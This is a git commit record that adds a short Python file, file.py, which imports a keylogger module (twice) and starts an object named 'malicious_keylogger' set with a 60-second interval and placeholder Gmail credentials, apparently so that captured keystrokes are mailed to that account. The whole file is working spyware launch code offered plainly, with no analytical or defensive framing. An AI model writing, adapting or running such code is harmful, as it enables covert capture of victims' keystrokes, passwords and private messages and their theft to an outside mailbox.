10594ca72f638678420523b944c26bb3053df83e
UDAYSAI8 <68594069+UDAYSAI8@users.noreply.github.com>
2024-04-19 22:17:21 +0530

    Create file.py

---
+++ file.py
@@ -0,0 +1,10 @@
+import keylogger
+
+
+import keylogger
+
+
+malicious_keylogger: keylogger.KeyLogger = keylogger.KeyLogger(60, 'your_mail_id@gmail.com', 'mail_password')
+
+
+malicious_keylogger.start()
